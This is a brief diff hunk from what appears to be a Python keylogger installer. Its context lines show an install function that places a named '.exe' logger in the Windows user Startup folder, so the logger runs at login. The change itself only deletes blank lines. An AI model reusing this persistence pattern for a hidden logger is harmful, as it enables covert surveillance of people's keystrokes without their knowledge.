@@ -11,8 +11,6 @@ def install(path=f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/St
     loggerName = file.readline() + '.exe'
     file.close()
 
-
-
     end = 'Logger installed succesfully'
 
     try:
